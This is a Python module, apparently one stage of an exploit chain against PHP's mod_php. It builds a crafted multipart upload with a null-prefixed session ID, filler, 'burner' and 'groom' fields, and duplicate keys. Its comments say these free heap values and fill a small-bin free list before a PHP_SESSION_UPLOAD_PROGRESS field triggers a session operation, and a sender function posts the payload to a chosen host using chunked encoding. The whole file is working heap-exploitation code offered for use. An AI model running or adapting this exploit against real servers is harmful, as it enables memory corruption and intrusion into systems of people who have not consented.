#!/usr/bin/env python3
"""A1 producer owned by the modphp-a1b1 chain."""

from __future__ import annotations

import socket

from .wire import Part, iter_multipart, recv_all


A1_BOUNDARY = b"codex843a1boundary"


def padded(prefix: bytes, length: int, fill: bytes) -> bytes:
    if length <= len(prefix):
        return prefix
    return prefix + fill * (length - len(prefix))


def a1_parts(
    *,
    sid_size: int,
    sid_late: bool,
    files: int,
    depth: int,
    live_files: int,
    ct1: int,
    ct2: int,
    fillers: int,
    filler_name: int,
    filler_value: int,
    big: int,
    big_size: int,
    big_name: int,
    big_name_count: int,
    big_alt_name: int,
    tail_big_size: int,
    tail_big_count: int,
    burners: int,
    burner_size: int,
    burner_name: int,
    burner_long_name_count: int,
    burner_long_name: int,
    late_groom_fields: int,
    late_groom_name: int,
    late_groom_value: int,
    late_groom_alt_value_count: int,
    late_groom_alt_value: int,
    released_fields: int,
    released_name: int,
    released_value: int,
    released_alt_value_count: int,
    released_alt_value: int,
    released_replacement_value: int,
    released_long_replacement_count: int,
    released_long_replacement_value: int,
    progress_size: int,
) -> list[Part]:
    sid = Part(b"PHPSESSID", b"\0" + b"I" * max(0, sid_size - 1))
    parts = [] if sid_late else [sid]
    suffix = b"[a]" * depth
    for index in range(files):
        filename = b""
        content_type = None
        if index == 0 and live_files >= 1:
            filename = b"A"
            content_type = b"A" * ct1
        elif index == 1 and live_files >= 2:
            filename = b"A"
            content_type = b"A" * ct2
        parts.append(Part(f"u{index:04d}".encode() + suffix, b"", filename, content_type))
    for index in range(fillers):
        parts.append(
            Part(
                padded(f"f{index:03d}".encode(), filler_name, b"F"),
                b"v" * filler_value,
            )
        )
    for index in range(big):
        name_length = big_name if big_name_count < 0 or index < big_name_count else big_alt_name
        value_size = tail_big_size if tail_big_size >= 0 and index >= big - tail_big_count else big_size
        parts.append(
            Part(
                padded(f"g{index:03d}".encode(), name_length, b"G"),
                b"G" * value_size,
            )
        )
    for index in range(burners):
        name_length = (
            burner_long_name
            if index >= burners - burner_long_name_count
            else burner_name
        )
        parts.append(
            Part(
                padded(f"b{index:03d}".encode(), name_length, b"B"),
                b"B" * burner_size,
            )
        )
    for index in range(late_groom_fields):
        value_size = (
            late_groom_alt_value
            if index >= late_groom_fields - late_groom_alt_value_count
            else late_groom_value
        )
        parts.append(
            Part(
                padded(f"l{index:03d}".encode(), late_groom_name, b"L"),
                b"L" * value_size,
            )
        )
    # Duplicate keys release the first retained value while preserving its
    # bytes in the selected small-bin free list for later session allocations.
    released_names = [
        padded(f"r{index:03d}".encode(), released_name, b"R")
        for index in range(released_fields)
    ]
    for index, name in enumerate(released_names):
        value_size = (
            released_alt_value
            if index >= released_fields - released_alt_value_count
            else released_value
        )
        parts.append(Part(name, b"R" * value_size))
    for index, name in enumerate(released_names):
        replacement_value = (
            released_long_replacement_value
            if index >= released_fields - released_long_replacement_count
            else released_replacement_value
        )
        parts.append(Part(name, b"r" * replacement_value))
    if sid_late:
        parts.append(sid)
    # Deliberately last: MULTIPART_EVENT_END becomes the first session
    # operation after the heap has been filled by all preceding fields.
    parts.append(Part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_size))
    return parts


def send_a1(
    host: str,
    port: int,
    path: str,
    parts: list[Part],
    *,
    chunk_size: int = 16384,
    host_header: str | None = None,
    timeout: float = 30.0,
) -> bytes:
    """Send A1 with profile-selected transport segmentation."""
    if chunk_size < 1:
        raise ValueError("chunk_size must be positive")
    body = b"".join(iter_multipart(parts, A1_BOUNDARY))
    authority = host if host_header is None else host_header
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.settimeout(timeout)
        sock.sendall(
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            f"Content-Type: multipart/form-data; boundary={A1_BOUNDARY.decode()}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: close\r\n\r\n".encode()
        )
        for offset in range(0, len(body), chunk_size):
            chunk = body[offset : offset + chunk_size]
            sock.sendall(f"{len(chunk):x}\r\n".encode())
            sock.sendall(chunk)
            sock.sendall(b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        return recv_all(sock, 1 << 20)
    finally:
        sock.close()



